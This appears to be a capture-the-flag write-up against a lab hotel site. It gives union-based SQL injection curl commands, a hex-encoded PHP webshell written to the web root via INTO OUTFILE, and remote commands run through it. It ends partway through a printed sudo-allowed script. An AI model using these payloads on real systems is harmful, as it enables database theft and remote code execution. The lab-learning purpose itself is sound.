200      GET      650l     5970w   193352c http://supersecurehotel.htb/fonts/icomoon/icomoon.woff  
200      GET       86l     9516w   632126c http://supersecurehotel.htb/fonts/icomoon/icomoon.svg  
200      GET     1564l     8377w   800721c http://supersecurehotel.htb/images/img_bg_5.jpg  
200      GET      117l      365w     4877c http://supersecurehotel.htb/phpmyadmin/doc/html/developers.html  
200      GET     2110l     6289w    74695c http://supersecurehotel.htb/phpmyadmin/js/designer/move.js  
200      GET      638l     2783w    33723c http://supersecurehotel.htb/phpmyadmin/doc/html/glossary.html  
200      GET      130l      501w     6266c http://supersecurehotel.htb/phpmyadmin/doc/html/settings.html  
200      GET      169l      546w     8659c http://supersecurehotel.htb/phpmyadmin/doc/html/user.html  
200      GET      224l      898w    11438c http://supersecurehotel.htb/phpmyadmin/doc/html/themes.html  
200      GET      151l      529w     6572c http://supersecurehotel.htb/phpmyadmin/doc/html/copyright.html  
200      GET      102l      273w     3662c http://supersecurehotel.htb/phpmyadmin/doc/html/search.html  
200      GET      219l     1110w    12017c http://supersecurehotel.htb/phpmyadmin/doc/html/security.html  
200      GET      172l      665w     8462c http://supersecurehotel.htb/phpmyadmin/doc/html/require.html  
200      GET      194l      935w    10153c http://supersecurehotel.htb/phpmyadmin/doc/html/relations.html  
200      GET      186l      867w    10054c http://supersecurehotel.htb/phpmyadmin/doc/html/bookmarks.html  
200      GET     1750l     9846w   856454c http://supersecurehotel.htb/images/cover_img_1.jpg  
500      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/tbl_partition_definition.inc.php  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/rte/rte_main.inc.php  
200      GET      228l      904w    14976c http://supersecurehotel.htb/phpmyadmin/doc/html/index.html  
200      GET      245l     1320w    13570c http://supersecurehotel.htb/phpmyadmin/doc/html/transformations.html  
200      GET        1l       27w    71187c http://supersecurehotel.htb/phpmyadmin/doc/html/searchindex.js  
200      GET      300l     1179w    15016c http://supersecurehotel.htb/phpmyadmin/doc/html/charts.html  
200      GET      470l     2483w    27564c http://supersecurehotel.htb/phpmyadmin/doc/html/import_export.html  
301      GET        9l       28w      336c http://supersecurehotel.htb/phpmyadmin/js => http://supersecurehotel.htb/phpmyadmin/js/  
301      GET        9l       28w      337c http://supersecurehotel.htb/phpmyadmin/sql => http://supersecurehotel.htb/phpmyadmin/sql/  
200      GET     1971l    10725w   828352c http://supersecurehotel.htb/images/img_bg_4.jpg  
200      GET       58l      240w     1878c http://supersecurehotel.htb/phpmyadmin/templates/prefs_twofactor.twig  
200      GET      573l     1267w   192646c http://supersecurehotel.htb/images/img_bg_3.jpg  
200      GET      188l      945w    10064c http://supersecurehotel.htb/phpmyadmin/doc/html/privileges.html  
200      GET       24l       82w      671c http://supersecurehotel.htb/phpmyadmin/sql/upgrade_tables_4_7_0+.sql  
200      GET       16l      105w      694c http://supersecurehotel.htb/phpmyadmin/templates/div_for_slider_effect.twig  
200      GET     1353l     3569w    45625c http://supersecurehotel.htb/phpmyadmin/doc/html/credits.html  
200      GET     1454l    10004w   122012c http://supersecurehotel.htb/phpmyadmin/doc/html/setup.html  
200      GET     2283l    11987w   884944c http://supersecurehotel.htb/images/img_bg_1.jpg  
200      GET      123l      365w     4959c http://supersecurehotel.htb/phpmyadmin/templates/view_create.twig  
301      GET        9l       28w      339c http://supersecurehotel.htb/phpmyadmin/setup => http://supersecurehotel.htb/phpmyadmin/setup/  
301      GET        9l       28w      342c http://supersecurehotel.htb/phpmyadmin/examples => http://supersecurehotel.htb/phpmyadmin/examples/  
200      GET     4265l     4761w   150011c http://supersecurehotel.htb/phpmyadmin/doc/html/genindex.html  
200      GET       12l       42w      338c http://supersecurehotel.htb/phpmyadmin/templates/navigation/logo.twig  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/examples/config.manyhosts.inc.php  
200      GET     6192l    29274w   357515c http://supersecurehotel.htb/phpmyadmin/doc/html/config.html  
200      GET       28l      449w   821711c http://supersecurehotel.htb/phpmyadmin/js/vendor/zxcvbn.js  
200      GET      155l      496w     5640c http://supersecurehotel.htb/phpmyadmin/js/import.js  
200      GET       34l       82w      934c http://supersecurehotel.htb/phpmyadmin/js/server_status_queries.js  
200      GET      101l      332w     3264c http://supersecurehotel.htb/phpmyadmin/js/shortcuts_handler.js  
200      GET      101l      316w     3710c http://supersecurehotel.htb/phpmyadmin/js/server_status_advisor.js  
200      GET       59l      186w     2525c http://supersecurehotel.htb/phpmyadmin/js/u2f.js  
200      GET      100l      271w     3262c http://supersecurehotel.htb/phpmyadmin/js/server_status_variables.js  
200      GET      168l      484w     6359c http://supersecurehotel.htb/phpmyadmin/js/db_operations.js  
200      GET      246l      718w     8763c http://supersecurehotel.htb/phpmyadmin/js/db_search.js  
200      GET       79l      333w     2985c http://supersecurehotel.htb/phpmyadmin/js/multi_column_sort.js  
200      GET      239l      823w    10952c http://supersecurehotel.htb/phpmyadmin/js/db_central_columns.js  
200      GET     1012l     3324w    37870c http://supersecurehotel.htb/phpmyadmin/js/sql.js  
200      GET      320l     1265w    97665c http://supersecurehotel.htb/phpmyadmin/js/makegrid.js  
200      GET      360l     1156w    85807c http://supersecurehotel.htb/phpmyadmin/js/server_status_monitor.js  
200      GET      380l     1531w    31246c http://supersecurehotel.htb/phpmyadmin/js/ajax.js  
200      GET      359l      895w    57278c http://supersecurehotel.htb/phpmyadmin/js/console.js  
200      GET       16l       38w      412c http://supersecurehotel.htb/phpmyadmin/js/transformations/xml_editor.js  
200      GET       18l       64w      665c http://supersecurehotel.htb/phpmyadmin/js/transformations/xml.js  
200      GET       17l       42w      477c http://supersecurehotel.htb/phpmyadmin/js/transformations/json_editor.js  
200      GET       20l       22w     1200c http://supersecurehotel.htb/phpmyadmin/libraries/certs/2e5ac55d.0  
200      GET       28l       85w      834c http://supersecurehotel.htb/phpmyadmin/js/transformations/image_upload.js  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/dbi/dbi_dummy.inc.php  
200      GET       16l       73w      528c http://supersecurehotel.htb/phpmyadmin/libraries/certs/README.rst  
200      GET       18l       64w      670c http://supersecurehotel.htb/phpmyadmin/js/transformations/json.js  
200      GET       11l       33w      312c http://supersecurehotel.htb/phpmyadmin/js/transformations/sql_editor.js  
200      GET       31l       33w     1967c http://supersecurehotel.htb/phpmyadmin/libraries/certs/6187b673.0  
200      GET       31l       33w     1967c http://supersecurehotel.htb/phpmyadmin/libraries/certs/4042bcee.0  
200      GET        7l       27w      314c http://supersecurehotel.htb/phpmyadmin/templates/javascript/display.twig  
200      GET        4l       13w      114c http://supersecurehotel.htb/phpmyadmin/templates/components/error_message.twig  
200      GET       49l      124w     1601c http://supersecurehotel.htb/phpmyadmin/templates/export/alias_add.twig  
200      GET       10l       29w      267c http://supersecurehotel.htb/phpmyadmin/templates/export/alias_item.twig  
200      GET       32l      111w     1228c http://supersecurehotel.htb/phpmyadmin/templates/error/report_form.twig  
200      GET       20l       78w      791c http://supersecurehotel.htb/phpmyadmin/templates/encoding/kanji_encoding_form.twig  
301      GET        9l       28w      353c http://supersecurehotel.htb/phpmyadmin/themes/original/css => http://supersecurehotel.htb/phpmyadmin/themes/original/css/  
301      GET        9l       28w      340c http://supersecurehotel.htb/phpmyadmin/locale => http://supersecurehotel.htb/phpmyadmin/locale/  
301      GET        9l       28w      349c http://supersecurehotel.htb/phpmyadmin/themes/original => http://supersecurehotel.htb/phpmyadmin/themes/original/  
200      GET        1l        1w        7c http://supersecurehotel.htb/phpmyadmin/templates/login/footer.twig  
200      GET       46l      203w     1758c http://supersecurehotel.htb/phpmyadmin/templates/columns_definitions/column_default.twig  
200      GET       26l      123w     1238c http://supersecurehotel.htb/phpmyadmin/templates/columns_definitions/transformation.twig  
200      GET       24l      127w     1243c http://supersecurehotel.htb/phpmyadmin/templates/columns_definitions/column_indexes.twig  
200      GET       16l       60w      630c http://supersecurehotel.htb/phpmyadmin/templates/columns_definitions/column_adjust_privileges.twig  
301      GET        9l       28w      343c http://supersecurehotel.htb/phpmyadmin/setup/lib => http://supersecurehotel.htb/phpmyadmin/setup/lib/  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/setup/lib/ConfigGenerator.php  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/setup/lib/Index.php  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/setup/lib/FormProcessing.php  
200      GET        1l        2w       15c http://supersecurehotel.htb/phpmyadmin/setup/lib/common.inc.php  
200      GET       52l      212w     1520c http://supersecurehotel.htb/phpmyadmin/README  
301      GET        9l       28w      340c http://supersecurehotel.htb/phpmyadmin/vendor => http://supersecurehotel.htb/phpmyadmin/vendor/  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/vendor/autoload.php  
200      GET       29l       75w      666c http://supersecurehotel.htb/phpmyadmin/vendor/bin/highlight-query  
200      GET       30l       75w      662c http://supersecurehotel.htb/phpmyadmin/vendor/bin/lint-query  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/vendor/composer/ClassLoader.php  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/vendor/composer/autoload_real.php  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/vendor/composer/autoload_namespaces.php  
200      GET       21l      168w     1070c http://supersecurehotel.htb/phpmyadmin/vendor/composer/LICENSE  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/vendor/composer/autoload_classmap.php  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/vendor/composer/autoload_files.php  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/vendor/composer/autoload_static.php  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/vendor/composer/autoload_psr4.php  
200      GET     1043l     1976w    33174c http://supersecurehotel.htb/phpmyadmin/vendor/composer/installed.json  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/setup/frames/index.inc.php  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/setup/frames/menu.inc.php  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/setup/frames/form.inc.php  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/setup/frames/config.inc.php  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/setup/frames/servers.inc.php  
301      GET        9l       28w      356c http://supersecurehotel.htb/phpmyadmin/themes/original/jquery => http://supersecurehotel.htb/phpmyadmin/themes/original/jquery/  
301      GET        9l       28w      346c http://supersecurehotel.htb/phpmyadmin/setup/frames => http://supersecurehotel.htb/phpmyadmin/setup/frames/  
200      GET      339l     2968w    18092c http://supersecurehotel.htb/phpmyadmin/LICENSE
```

This is an enormous amount of directories.

`302 http://supersecurehotel.htb/room.php => index.php` stands out in this haystack as the only one with `302` redirect and `room.php` suggests a parameter with `room IDs`, since this is a Hotel website, we might get access to different rooms.

We `curl` the `head` of the target :

```bash
>  curl -sI "http://supersecurehotel.htb/room.php"  
  
HTTP/1.1 302 Found  
Date: Wed, 24 Jun 2026 22:34:02 GMT  
Server: Apache/2.4.25 (Debian)  
Location: index.php  
Set-Cookie: PHPSESSID=0aaa1622rahv3ebv8c47j0ito0; path=/  
Expires: Thu, 19 Nov 1981 08:52:00 GMT  
Cache-Control: no-store, no-cache, must-revalidate  
Pragma: no-cache  
IronWAF: 2.0.3  
Content-Type: text/html; charset=UTF-8
```

And we find `Location: index.php`.

We also got `IronWAF: 2.0.3`.

When we try to book a room, we get `http://jarvis.htb/room.php?cod=6` which gives us the parameter `cod={𝑥}` for room numbers.

We'll curl using encoding `%20` for ` ` and try to `SQLi` with `cod=1 AND 1=2` : 

```bash
>  curl -s "http://supersecurehotel.htb/room.php?cod=1" | wc -c  
6204
>  curl -s "http://supersecurehotel.htb/room.php?cod=1%20AND%201=2" | wc -c  
5916
```

We can see that the `word/byte` count has been shortened with the SQLi.

We'll try the `SQL injection` with the tautologic `1=1` and we should get the same results as if there was no `SQLi` since contrary to our first injection where `1=2` is `always false` this should not affect the wordcount/binary result.

```bash
>  curl -s "http://supersecurehotel.htb/room.php?cod=1%20AND%201=1" | wc -c  
  
6204
```

And indeed it doesn't affect it.

That means we can ask the `SQL database` questions and it'll answer `no 5916` / `yes 6204` via `curl`.

We'll `ORDER BY` using `%20` encoding for ` ` :

```bash
>  curl -s "http://supersecurehotel.htb/room.php?cod=1%20ORDER%20BY%201" | wc -c && curl -s "http://supersecurehotel.htb/room.php?cod=1%20ORDER%20BY%202" | wc -c && curl -s "http://supersecurehotel.htb/room.php  
?cod=1%20ORDER%20BY%203" | wc -c && curl -s "http://supersecurehotel.htb/room.php?cod=1%20ORDER%20BY%204" | wc -c && curl -s "http://supersecurehotel.htb/room.php?cod=1%20ORDER%20BY%205" | wc -c && curl -s "htt  
p://supersecurehotel.htb/room.php?cod=1%20ORDER%20BY%206" | wc -c && curl -s "http://supersecurehotel.htb/room.php?cod=1%20ORDER%20BY%207" | wc -c && curl -s "http://supersecurehotel.htb/room.php?cod=1%20ORDER%  
20BY%208" | wc -c  
  
  
  
  
  
  
6204  
6204  
6204  
6204  
6204  
6204  
6204  
5916
```

So the answers are `yes` until `ORDER BY 8`.

We now use `UNION SELECT` with `null` and then for a `user()` with `null` :

```bash
>  curl -s "http://supersecurehotel.htb/room.php?cod=1%20UNION%20SELECT%20null,null,null,null,null,null,null" | wc -c  
  
6204
>  curl -s "http://supersecurehotel.htb/room.php?cod=1%20UNION%20SELECT%20user(),null,null,null,null,null,null" | wc -c  
  
6204
```

We get the same response.

That means `user()` exists but since the `wordcount/binary` is the same, it might not appear directly.

We might try to find a `user` line but it seems improbable since the `wc` count is the same :

```bash
>  curl -s "http://supersecurehotel.htb/room.php?cod=1" -o /tmp/room1.html  
  
>  curl -s "http://supersecurehotel.htb/room.php?cod=1%20UNION%20SELECT%20user(),null,null,null,null,null,null" -o /tmp/room_union.html  
  
>  diff /tmp/room1.html /tmp/room_union.html | head -40
```

And it returns nothing. It's the exact same `html` page.

The user returned is `supersecurehotel@logger.htb` which is the one that was discovered early on on the webpage.

We try `UNION SELECT user()` without a real room : `cod=-1` :

```bash
>  curl -s "http://supersecurehotel.htb/room.php?cod=-1%20UNION%20SELECT%20user(),null,null,null,null,null,null" -o /tmp/room_union_only.html  
>  wc -c /tmp/room_union_only.html  
  
5933 /tmp/room_union_only.html
```

We get a different size : `5933` which is slightly larger than the `no 5916`. 
`no` was expected as `room cod=-1` doesn't exist, but that means we might get our `user`.

This is intriguing.

We get the diff between the `yes` and this response :

```bash
>  diff /tmp/room1.html /tmp/room_union_only.html | head -50  
  
106c106  
<                                               <a href="/images/room-6.jpg" class="room image-popup-link" style="background-image: url(/images/room-6.jpg);"></a>  
---  
>                                               <a href="/images/" class="room image-popup-link" style="background-image: url(/images/);"></a>  
108,109c108,109  
<                                                       <span class="rate-star"><i class="icon-star-full full"></i><i class="icon-star-full full"></i><i class="icon-star-full full"></i><i class="icon-star-full  
full"></i><i class="icon-star-full"></i></span>  
<                                                       <h3><a href="/room.php?cod=1">Superior Family Room</a></h3>  
---  
>                                                       <span class="rate-star"></span>  
>                                                       <h3><a href="/room.php?cod=DBadmin@localhost"></a></h3>  
112c112  
<                                                               <span class="price-room">270</span>  
---  
>                                                               <span class="price-room"></span>  
115,116c115  
<                                                       <p>Superior room, perfect for luxury families.  
< Big room with a lot of extras</p>  
---  
>                                                       <p></p>
```

We got `/room.php?cod=DBadmin@localhost`.

We'll try to `curl` with `UNION SELECT database()` now :

```bash
>  curl -s "http://supersecurehotel.htb/room.php?cod=-1%20UNION%20SELECT%20database(),null,null,null,null,null,null" -o /tmp/dbunion.html
>  diff /tmp/room_union_only.html /tmp/dbunion.html | head -50  
109c109  
<                                                       <h3><a href="/room.php?cod=DBadmin@localhost"></a></h3>  
---  
>                                                       <h3><a href="/room.php?cod=hotel"></a></h3>
```

We got `cod=hotel`, which is the `database` name. Fits. We'll then explore the tables from the database using `UNION SELECT table_name FROM information_schema` :

```bash
>  curl -s "http://supersecurehotel.htb/room.php?cod=-1%20UNION%20SELECT%20table_name,null,null,null,null,null,null%20FROM%20information_schema.tables%20WHERE%20table_schema='hotel'%20LIMIT%201" | grep -oE 'cod  
=[^"]+'  
  
cod=room
```

We try to `concatenate` the `table_names` from the databases :

```bash
  
>  curl -s "http://supersecurehotel.htb/room.php?cod=-1%20UNION%20SELECT%20group_concat(table_name),null,null,null,null,null,null%20FROM%20information_schema.tables%20WHERE%20table_schema='hotel'" | grep -oE 'c  
od=[^"]+'  
  
cod=room
```

Still `cod=room` as the only result.

`Offset 1 through 9` gave us nothing as well, so there might just be one table : `room`.

We verify the `count` of `tables` :

```bash
>  curl -s "http://supersecurehotel.htb/room.php?cod=-1%20UNION%20SELECT%20count(*),null,null,null,null,null,null%20FROM%20information_schema.tables%20WHERE%20table_schema='hotel'" | grep -oE 'cod=[^"]+'  
  
cod=1
```

So there is indeed only one table in the `hotel` database, and that's `room`.

Next logical step from `tables` is `columns` as per the `SQL database` logic, so we `UNION SELECT group_concat(column_name)` while specifying it's from `information_schema.columns` (all the columns in the database) where `table_schema` corresponds to the `hotel` database and the `room` table, and add the usual `grep` with `cod=` and the regex `[^"]+` which greps anything but `"` :

```bash
curl -s "http://supersecurehotel.htb/room.php?cod=-1%20UNION%20SELECT%20group_concat(column_name),null,null,null,null,null,null%20FROM%20information_schema.columns%20WHERE%20table_schema='hotel'%20AND%20table_name='room'" | grep -oE 'cod=[^"]+'
cod=cod,name,price,descrip,star,image,mini
```

We got `cod, name, price, descript, star, image, mini` as `columns`.

We also look for `schemata` :

```bash
>  curl -s "http://supersecurehotel.htb/room.php?cod=-1%20UNION%20SELECT%20group_concat(schema_name),null,null,null,null,null,null%20FROM%20information_schema.schemata" | grep -oE 'cod=[^"]+'
cod=hotel,information_schema,mysql,performance_schema
```

We got `hotel, information_schema, mysql` and `performance_schema`.

So no credentials or `ssh id_rsa` here, only a simple hotel database.

We'll create a PHP webshell :

```bash
>  python3 -c "print('0x' + '<?php system(\$_GET[\"c\"]); ?>'.encode().hex())"  
0x3c3f7068702073797374656d28245f4745545b2263225d293b203f3e
```

We `UNION SELECT` the `webshell` `INTO OUTFILE /var/www/html` as `shell.php` :

```bash
>  curl -s "http://supersecurehotel.htb/room.php?cod=-1%20UNION%20SELECT%200x3c3f7068702073797374656d28245f4745545b2763275d293b203f3e,null,null,null,null,null,null%20INTO%20OUTFILE%20'/var/www/html/shell.php'"  
  
<!DOCTYPE HTML>  
<html>  
       <head>  
       <meta charset="utf-8">  
       <meta http-equiv="X-UA-Compatible" content="IE=edge">  
       <title>Stark Hotel</title>  
       <meta name="viewport" content="width=device-width, initial-scale=1">  
       <meta name="description" content="" />  
       <meta name="keywords" content="" />  
       <meta name="author" content="" />  
  
 <!-- Facebook and Twitter integration -->  
       <meta property="og:title" content=""/>  
       <meta property="og:image" content=""/>  
       <meta property="og:url" content=""/>  
       <meta property="og:site_name" content=""/>  
       <meta property="og:description" content=""/>  
       <meta name="twitter:title" content="" />  
       <meta name="twitter:image" content="" />  
       <meta name="twitter:url" content="" />  
       <meta name="twitter:card" content="" />  
  
  
       <!-- Animate.css -->  
       <link rel="stylesheet" href="css/animate.css">  
       <!-- Icomoon Icon Fonts-->  
       <link rel="stylesheet" href="css/icomoon.css">  
       <!-- Bootstrap  -->  
       <link rel="stylesheet" href="css/bootstrap.css">  
  
       <!-- Magnific Popup -->  
       <link rel="stylesheet" href="css/magnific-popup.css">  
  
       <!-- Flexslider  -->  
       <link rel="stylesheet" href="css/flexslider.css">  
  
       <!-- Owl Carousel -->  
       <link rel="stylesheet" href="css/owl.carousel.min.css">  
       <link rel="stylesheet" href="css/owl.theme.default.min.css">  
  
       <!-- Date Picker -->  
       <link rel="stylesheet" href="css/bootstrap-datepicker.css">  
       <!-- Flaticons  -->  
       <link rel="stylesheet" href="fonts/flaticon/font/flaticon.css">  
  
       <!-- Theme style  -->  
       <link rel="stylesheet" href="css/style.css">  
  
       <!-- Modernizr JS -->  
       <script src="js/modernizr-2.6.2.min.js"></script>  
       <!-- FOR IE9 below -->  
       <!--[if lt IE 9]>  
       <script src="js/respond.min.js"></script>  
       <![endif]-->  
  
       </head>  
       <body>  
  
<div class="colorlib-loader"></div>  
  
       <div id="page">  
               <nav class="colorlib-nav" role="navigation">  
                       <div class="top">  
                               <div class="container">  
                                       <div class="row">  
                                               <div class="col-xs-4">  
                                                       <p class="site">supersecurehotel.htb</p>  
                                               </div>  
                                               <div class="col-xs-8 text-right">  
                                                       <p class="num">Call: +123456789</p>  
                                                       <ul class="colorlib-social">  
               <li><a href="#">Sign in </li>                <li><a href="#">Utilities</a></li>  
                                                               <li><a href="#"><i class="icon-twitter"></i></a></li>  
                                                               <li><a href="#"><i class="icon-facebook"></i></a></li>  
                                                               <li><a href="#"><i class="icon-linkedin"></i></a></li>  
                                                               <li><a href="#"><i class="icon-dribbble"></i></a></li>  
                                                       </ul>  
                                               </div>  
                                       </div>  
                               </div>  
                       </div>  
                       <div class="top-menu">  
                               <div class="container">  
                                       <div class="row">  
                                               <div class="col-xs-2">  
                                                       <div id="colorlib-logo"><a href="index.php">Stark Hotel</a></div>  
                                               </div>  
                                               <div class="col-xs-10 text-right menu-1">  
                                                       <ul>  
                                                               <li class="active"><a href="index.php">Home</a></li>  
                                                               <li class="has-dropdown">  
                                                                       <a href="rooms-suites.php">Rooms</a>  
                                                               </li>  
                                                               <li><a href="dining-bar.php">Dining &amp; Bar</a></li>  
  
                                                       </ul>  
                                               </div>  
                                       </div>  
                               </div>  
                       </div>  
               </nav>  
<div id="colorlib-rooms" class="colorlib-light-grey">  
                       <div class="container">  
                               <div class="row">  
                                       <div class="col-md-4 room-wrap animate-box">  
                                               <a href="/images/" class="room image-popup-link" style="background-image: url(/images/);"></a>  
                                               <div class="desc text-center">  
                                                       <span class="rate-star"></span>  
                                                       <h3><a href="/room.php?cod="></a></h3>  
                                                       <p class="price">  
                                                               <span class="currency">$</span>  
                                                               <span class="price-room"></span>  
                                                               <span class="per">/ per night</span>  
                                                       </p>  
                                                       <p></p>  
                                                       <p><a class="btn btn-primary">Go to book!</a></p>  
                                               </div>  
                                       </div>  <footer id="colorlib-footer" role="contentinfo">  
                       <div class="container">  
                               <div class="row row-pb-md">  
                                       <div class="col-md-3 colorlib-widget">  
                                               <h4>    <title>Stark Hotel</title></h4>  
                                               <p>Luxury hotel where you can feel cool although in reality you are a fool</p>  
                                               <p>  
                                                       <ul class="colorlib-social-icons">  
                                                               <li><a href="#"><i class="icon-twitter"></i></a></li>  
                                                               <li><a href="#"><i class="icon-facebook"></i></a></li>  
                                                               <li><a href="#"><i class="icon-linkedin"></i></a></li>  
                                                               <li><a href="#"><i class="icon-dribbble"></i></a></li>  
                                                       </ul>  
                                               </p>  
                                       </div>  
                                       <div class="col-md-3 colorlib-widget">  
                                               <h4>Quick Links</h4>  
                                               <p>  
                                                       <ul class="colorlib-footer-links">  
                                                               <li><a href="#">Dining &amp; Bar</a></li>  
                                                       </ul>  
                                               </p>  
                                       </div>  
                                       <div class="col-md-3 col-md-push-1">  
                                               <h4>Contact Information</h4>  
                                               <ul class="colorlib-footer-links">  
                                                       <li>291 South 21th Street, <br> Suite 721 New York NY 10016</li>  
                                                       <li><a href="#">+ 1235 2355 98</a></li>  
                                                       <li><a href="#">supersecurehotel@logger.htb</a></li>  
                                                       <li><a href="#">supersecurehotel.htb</a></li>  
                                               </ul>  
                                       </div>  
                               </div>  
                               <div class="row">  
                                       <div class="col-md-12 text-center">  
                                               <p>  
                                                       <small class="block">  
Copyright &copy;<script>document.write(new Date().getFullYear());</script>  
                                               </p>  
                                       </div>  
                               </div>  
                       </div>  
               </footer>  
       </div>  
  
       <div class="gototop js-top">  
               <a href="#" class="js-gotop"><i class="icon-arrow-up2"></i></a>  
       </div>  
  
       <!-- jQuery -->  
       <script src="js/jquery.min.js"></script>  
       <!-- jQuery Easing -->  
       <script src="js/jquery.easing.1.3.js"></script>  
       <!-- Bootstrap -->  
       <script src="js/bootstrap.min.js"></script>  
       <!-- Waypoints -->  
       <script src="js/jquery.waypoints.min.js"></script>  
       <!-- Flexslider -->  
       <script src="js/jquery.flexslider-min.js"></script>  
       <!-- Owl carousel -->  
       <script src="js/owl.carousel.min.js"></script>  
       <!-- Magnific Popup -->  
       <script src="js/jquery.magnific-popup.min.js"></script>  
       <script src="js/magnific-popup-options.js"></script>  
       <!-- Date Picker -->  
       <script src="js/bootstrap-datepicker.js"></script>  
       <!-- Main -->  
       <script src="js/main.js"></script>  
  
       </body>  
</html>  
  
>  curl -s "http://supersecurehotel.htb/shell.php?c=id"  
  
uid=33(www-data) gid=33(www-data) groups=33(www-data)  
       \N      \N      \N      \N      \N      \N
```

We get `uid=33` which is `www-data`.

```bash
>  curl -s "http://supersecurehotel.htb/shell.php?c=id"  
  
uid=33(www-data) gid=33(www-data) groups=33(www-data)  
       \N      \N      \N      \N      \N      \N  
>  curl -s "http://supersecurehotel.htb/shell.php?c=whoami"  
  
www-data  
       \N      \N      \N      \N      \N      \N  
>  curl -s "http://supersecurehotel.htb/shell.php?c=dir"  
  
ayax            dining-bar.php   images     phpmyadmin        sass  
b4nn3d          fonts            index.php  room.php          shell.php  
connection.php  footer.php       js         roomobj.php  
css             getfileayax.php  nav.php    rooms-suites.php  
       \N      \N      \N      \N      \N      \N  
>  curl -s "http://supersecurehotel.htb/shell.php?c=ls+/home"  
  
pepper  
  
>  curl -s "http://supersecurehotel.htb/shell.php?c=ls+/home/pepper"  
  
Web  
user.txt  
```


```bash
>  curl -s "http://supersecurehotel.htb/shell.php?c=ls+-la+/home/pepper"  
  
total 32  
drwxr-xr-x 4 pepper pepper 4096 May  9  2022 .  
drwxr-xr-x 3 root   root   4096 May  9  2022 ..  
lrwxrwxrwx 1 root   root      9 Mar  4  2019 .bash_history -> /dev/null  
-rw-r--r-- 1 pepper pepper  220 Mar  2  2019 .bash_logout  
-rw-r--r-- 1 pepper pepper 3526 Mar  2  2019 .bashrc  
drwxr-xr-x 2 pepper pepper 4096 May  9  2022 .nano  
-rw-r--r-- 1 pepper pepper  675 Mar  2  2019 .profile  
drwxr-xr-x 3 pepper pepper 4096 May  9  2022 Web  
-r--r----- 1 root   pepper   33 Jun 24 17:47 user.txt  
       \N      \N      \N      \N      \N      \N
```

`user.txt` is under `root/pepper` and we are `www.data` so we can't `concatenate` it :

```bash
>  curl -s "http://supersecurehotel.htb/shell.php?c=cat+/home/pepper/user.txt"  
  
       \N      \N      \N      \N      \N      \N
```

We'll try to see our own privileges :

```bash
>  curl -s "http://supersecurehotel.htb/shell.php?c=sudo+-l"  
  
Matching Defaults entries for www-data on jarvis:  
   env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin  
  
User www-data may run the following commands on jarvis:  
   (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py  
       \N      \N      \N      \N      \N      \N
```

`(pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py`

We read the `simpler.py` script :

```bash
>  curl -s "http://supersecurehotel.htb/shell.php?c=cat+/var/www/Admin-Utilities/simpler.py"  
#!/usr/bin/env python3  
from datetime import datetime  
import sys  
import os  
from os import listdir  
import re  
  
def show_help():  
   message='''  
********************************************************  
* Simpler   -   A simple simplifier ;)                 *  
* Version 1.0                                          *  
********************************************************  
Usage:  python3 simpler.py [options]  
  
Options:  
   -h/--help   : This help  
   -s          : Statistics  
   -l          : List the attackers IP  
   -p          : ping an attacker IP  
   '''  
   print(message)  
  
def show_header():  
   print('''***********************************************  
    _                 _                          
___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _    
/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |  
\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |  
|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |  
               |_|               |_|    |___/    
                               @ironhackers.es  
                                  
***********************************************  
''')  
  
def show_statistics():  
   path = '/home/pepper/Web/Logs/'  
   print('Statistics\n-----------')  
   listed_files = listdir(path)  
   count = len(listed_files)  
   print('Number of Attackers: ' + str(count))  
   level_1 = 0  
   dat = datetime(1, 1, 1)  
   ip_list = []  
   reks = []  
   ip = ''  
   req = ''  
   rek = ''  
   for i in listed_files:  
       f = open(path + i, 'r')  
       lines = f.readlines()  
       level2, rek = get_max_level(lines)  
       fecha, requ = date_to_num(lines)  
       ip = i.split('.')[0] + '.' + i.split('.')[1] + '.' + i.split('.')[2] + '.' + i.split('.')[3]  
       if fecha > dat:  
           dat = fecha  
           req = requ  
           ip2 = i.split('.')[0] + '.' + i.split('.')[1] + '.' + i.split('.')[2] + '.' + i.split('.')[3]  
       if int(level2) > int(level_1):  
           level_1 = level2  
           ip_list = [ip]  
           reks=[rek]  
       elif int(level2) == int(level_1):  
           ip_list.append(ip)  
           reks.append(rek)  
       f.close()  
  
   print('Most Risky:')  
   if len(ip_list) > 1:  
       print('More than 1 ip found')  
   cont = 0  
   for i in ip_list:  
       print('    ' + i + ' - Attack Level : ' + level_1 + ' Request: ' + reks[cont])  
       cont = cont + 1  
  
   print('Most Recent: ' + ip2 + ' --> ' + str(dat) + ' ' + req)  
  
def list_ip():  
   print('Attackers\n-----------')  
   path = '/home/pepper/Web/Logs/'  
   listed_files = listdir(path)  
   for i in listed_files:  
       f = open(path + i,'r')  
       lines = f.readlines()  
       level,req = get_max_level(lines)  
       print(i.split('.')[0] + '.' + i.split('.')[1] + '.' + i.split('.')[2] + '.' + i.split('.')[3] + ' - Attack Level : ' + level)  
       f.close()  
